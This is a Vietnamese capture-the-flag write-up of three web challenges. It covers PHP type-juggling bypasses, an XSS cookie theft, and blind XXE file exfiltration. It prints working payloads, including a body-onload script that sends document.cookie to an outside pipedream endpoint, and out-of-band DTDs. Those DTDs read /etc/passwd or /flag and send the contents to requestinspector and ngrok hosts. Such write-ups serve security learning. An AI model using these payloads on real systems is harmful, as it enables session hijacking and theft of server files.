# KMA_CTF_WRITEUP - Trần Mạnh Huy
## WEB_CHANLLENGE

## Table of content web challenge:
* [Đề 1: PHPRI PHPRAI](#Đề-1-phpri-phprai)
* [Đề 2: Hi hi hi](#Đề-2-hi-hi-hi)
* [Đề 3: XXD](#Đề-3-xxd)

## Đề 1: PHPRI PHPRAI
```
url: http://47.254.251.2:8889/
```
Khi mở đường dẫn đề bài ra chúng ta được một trang web chứa source code php với các thử thách được chia nhỏ để tìm các flag. Ngay lúc này em nghĩ ý tưởng của bài là ghép tất cả các flag ta có thể tìm được thành 1 flag hoàn chỉnh. Với cả 5 phần nhìn qua điểm chung đều là ta phải nhập các tham số từ url sao cho thỏa mãn yêu cầu từng phần. Có thể nhận thấy đây toàn là php juggling..
```
Ở trong bài này em chú ý có phần toán từ == và toán tử === (!==) xuất hiện khá nhiều, cụ thể:
==  là toán so sánh trừu tượng (lỏng lẻo): toán tử nàysẽ cố gắng giải quyết các kiểu dữ liệu thông qua việc chuyển đổi kiểu dữ liệu trước khi só sánh.
===  là toán tử so sánh nghiêm ngặt : toán tử này thì sẽ kh chuyển đổi kiểu dữ liệu như vậy, nó sẽ trả về false nếu khác kiểu dữ liệu và giá trị.
```

![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/z3736517203811_1b61eb3debd0cf155bb3d182abe1026a%20(1).jpg)


### flag1:
Đoạn code kiểm tra xem giá trị của 2 biến $_Get '1' và '2' xem có được nhập kh, sau đó sẽ gán giá trị tương ứng cho 2 biến str1 và str2 . Để in ra flag thì em cần nhập 2 giá trị này sao cho giá trị là khác nhau nhưng khi md5 lên thì giá trị sẽ giống nhau. Ở đây e có 2 hướng, hướng 1 là mình nhập 2 mảng là 1[] = a và 2[] = b sao cho a và b là 2 giá trị số khác nhau như đề bài. Sau nó sẽ thành: $_GET["1"][0] = a và $_GET["2"][0] = b, khi md5 1 mảng lên thì ta sẽ bị lỗi, mà lỗi thì trả về kết quả giống nhau. Hướng thứ 2 em thử nhập 2 giá trị chuỗi khác nhau nhưng khi md5 lên thì cùng kết quả, ví dụ như ?1=240610708&2=QNKCDZO,... em có tìm hiểu được khi md5 ra nó về dạng 0e..., chúng cùng = int(0) và vì vậy giá trị sẽ bằng nhau(==).
url: http://47.254.251.2:8889/?1[]=a&2[]=b
```
Và như vậy em có flag1: KCSC{B0_u_Bu_S4
```
### flag2:
Đoạn code này em phân tích ra là hàm strcmp() so sánh 2 chuỗi trả về, và trả về 0 nếu chúng giống nhau. Vì vậy em đoán $flag trống, nên em thử nhập ?3= , kết quả trả về luôn flag, ngoài ra em nghĩ có thể dùng mẹo nhập mảng cũng sẽ cho kết quả tương tự. 
url: http://47.254.251.2:8889/?3=
```
Và bài trả về  flag2: C_8usssssss_htt
```
### flag3:
Ở flag thứ 3, đề yêu cầu bắt đầu với chuỗi truy vấn là ?4= một giá trị thỏa mãn điều kiện 'lỏng lẻo' là bằng 1.4e5 và điều kiện 'chặt chẽ' là giá trị nhập vào phải khác giá trị hoặc kiểu dữ liệu 1.4e5. Vì 1.4e5 ở đây có giá trị tương đương với 1.4x(10^5) hay bằng 140000 nên em nghĩ có thể qua thử thách này ở điều kiện chặt bằng việc đổi kiểu dữ liệu ta nhập vào, ở đây em truyền vào giá trị giống vậy nhưng đổi kiểu dữ liệu sang float: 140000.00 . Sau đó ta có flag3 với url:http://47.254.251.2:8889/?4=140000.00 
```
flag3: ps://www.youtub
```
### flag4:
Ở flag thứ 4 này cũng như ở flag trước nhưng có thay đổi 1 chút về điều kiện, cụ thể ở đây em phải nhập 1 chuỗi có giá trị bằng 69 nhưng điều kiện nghiêm ngặt thì phải khác 69, đồng thời dữ liệu trả về có độ dài là 2 sau khi loại bỏ khoảng trắng ở đầu cuối bởi 'trim'.Ý tưởng của e là truyền vào url ?5=  giá trị là  ' 69', tức url lúc này nhận giá trị có dạng %2069 (url encode dấu cách). Lúc này, tham số được chuyền vào là dạng chuỗi nhưng là so sánh lỏng lẻo nên điều kiện đầu đúng và điều kiện thứ 2 nghiêm ngặt cũng đúng vì khác kiểu, thỏa mã $str5 == 69 && $str5 !== '69', sau đó trim đi khoảng trắng là dấu cách ta dược dữ  liệu trả về = 2, kết quả sẽ trả về true. 
url: http://47.254.251.2:8889/?5=%2069
```
Flag4: e.com/watch?v=x
```
### flag5:
Ý cuối này đùng hàm preg_replace để loại bỏ các giá trị được lưu trữ trong biến var1 (với $var1='KaCeEtCe') và rồi gán giá trị còn lại vào trong biến var2, sau đó là điều kiện kiểm tra. Em nghĩ đến việc chèn giá trị KaCeEtCe vào bên trong KaCeEtCe, kiểu như 'KaCeKaCeEtCeEtCe' hoặc 'KKaCeEtCeaCeEtCe', sau khi giá trị này đi qua hàm preg_replace thì nó sẽ loại bỏ giá trị 'KaCeEtCe' bên trong và trả về giá trị mà em cần là 'KaCeEtCe' đúng với yêu cầu. 
url: http://47.254.251.2:8889/?6=KaCeKaCeEtCeEtCe
```
Và em có flag cuối cùng: QtC3F8fH6g}
```
## Vậy flag cuối cùng của bài sẽ là: 
>KCSC{B0_u_Bu_S4C_8usssssss_https://www.youtube.com/watch?v=xQtC3F8fH6g}


## Đề 2: Hi hi hi
```
url: http://146.190.115.228:20109/
```
Đập vào mắt chúng ta là 1 thanh nhập, bài này ở thanh nhập em sẽ tấn công xss, còn chỗ 'đây' để gửi link chữa mã độc cho bên phía server, nếu đúng con bot sẽ trả về cho mình flag , trước hết em thử 1 vài payload để xem trang web đang filter những gì. 
+ Thử payload cơ bản: <script>alert(1)</script>, có thể thấy nội dung truyền đang bị chứa trong thẻ div, vì vậy ta có thể dùng 1 vài thẻ khác.

 ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xss4.jpg)

+ Ở đây em dùng thử thẻ body: <body onload=alert(1)> thì trang web đã báo alert, vậy có thể tấn công tiếp từ đây.
  
  ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xssa.jpg)
  
+ ý tưởng tiếp theo là em sẽ truyền mã độc để lấy cookie từ phía con bot.
 Em viết ý tưởng như sau:  ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/oke.jpg)
 Ở đây em dùng pipedream để tạo đường dẫn chuyển trang của mình.
 Và trang đã chuyển hướng thành công và trả về cookie.
 Em vào link trang thứ 2 gửi url cho con bot: http://127.0.0.1:13337/?message=http://146.190.115.228:20109/?message=%3Cbody+onload%3D%22window.location%3D%27https%3A%2F%2Feok9n2xgj1cunb2.m.pipedream.net%3Fc%3D%27.concat%28document.cookie%29%22+%2F%3E
 
  Kết quả flag được trả về: 
  
  ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xss5.jpg)


  

 >Flag: KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}

## Đề 3: XXD Cách 1:
```
url: http://146.190.115.228:13373/

```
 ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xxe0.jpg)
 
Đến với giao diện trang, đây là 1 form đăng nhập, kết quả sẽ được ghi lại, vì vậy mình thử bắt request bằng burpsuite xem kết quả như thế nào.
 
  ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xxe_0.jpg)
 
Như trên có thể thấy trang web gửi thông tin mình nhập vào về phía server bằng xml, đến đây nghĩ đến ngay lỗ hổng xxe.
Thử 1 vài payload trên Payload All The Things, nhưng vẫn trả status về 1 nên em chuyển hướng sang blind xxe.
Sau 1 hòi thử thì đến đây em dùng dạng "XXE OOB with DTD and PHP filter" để tấn công:
 
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```
+ Bước đầu em đến https://requestinspector.com/ và tạo 1 endpoint, lúc này tạo được Request-Inspector endpoint như sau:  https://requestinspector.com/inspect/01gq03f0g3vk1p7dfpsm4060m0


+ Sau đó em tạo 1 file xml thứ cấp có nội dung: 
 
 ```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://requestinspector.com/inspect/01d0fpjtce5cd5ae80menm0hyw?%data;'>">
 ```
 
Rồi đến 'paste bin' và dán nội dung trên, chuyển về dạng raw output có dạng https://pastebin.com/raw/EhmjFvs0

 
![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xml2.jpg)
 
![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xml3.jpg)

Lệnh này nói với XML emgine lấy nội dung của /flag.txt mà bài đã hint cho, decode base-64 và gửi nó dưới dạng tham số URI request.

+ Bước tiếp theo em tạo file xml chính có nội dung như dưới gửi vào burpsuite để send request:

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "https://pastebin.com/raw/EhmjFvs0">
%sp;
%param1;
]>
<r>&exfil;</r>
```
![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xml4.jpg)

Raw output sẽ có sẵn trong URI 'https://pastebin.com/raw/EhmjFvs0'
 
Cmd trên sẽ tương tác với xml engine và giúp thực thi file xml khác là file thứ cấp vừa tạo ở trên.
 
Sau khi gửi request em vào https://requestinspector.com/p/01gq03f0g3vk1p7dfpsm4060m0 để xem thì ta được đoạn thông tin trả về.
 
![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xml5.jpg)

Decode bas64 ta được kết quả là flag cần tìm:
 
![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xml6.jpg)

>Flag: KCSC{blind_xxD_xxO_xx]_xxe!!@#@}
 
 ## XXD Cách 2: 
 Tương tự như trên nhưng ở đây em dựng server lên để nhận flag về.
 Đầu tiên em dựng server bên phía máy mình bằng python ở trên kali:
 
 ```
 python -m http.server 8005
 
 ```
 Bước tiếp theo em dựng ngrok để tạo đường hầm kết nối giữa local e vừa tạo và internet:
 
 ```
 ngrok http 0.0.0.0:8005
 ```
 ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/ngrok..jpg)
 
 Sau khi tạo ngrok, đến đây em tạo 1 file xml thứ cấp ở bên phía server, có tên xxe.xml với nội dung: 
 
 ```
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://fc4a-171-236-56-28.ap.ngrok.io/xxe.xml?%data;'>">
 
```
 Sau đó em truyền file trên lên server mình tạo bằng cách dùng curl:
 
 ```
 curl -X PUT -d "xxe.xml" http://0.0.0.0:8005/xxe.xml
 ```
 
 Và nội dung chính truyền ở trên burp-suite sẽ thực thi cmd trong file xxe.xml trên: 
 
 ```
 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE data [ 
<!ELEMENT data ANY >
<!ENTITY % sp SYSTEM "https://fc4a-171-236-56-28.ap.ngrok.io/xxe.xml"> 
%sp; 
%param1; 
]>
<data>
    <name>
        &exfil;
    </name>
    ...
</data
 
 ```
  ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/burpsuite.jpg)
 
 Được đoạn mã trả về: 
 
 ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/server.jpg)
 
 Decode là ra flag: 
 
 ![alt text](https://github.com/manhhuy2002/Hello_world/blob/main/xml6.jpg)

 >Flag: KCSC{blind_xxD_xxO_xx]_xxe!!@#@}
  
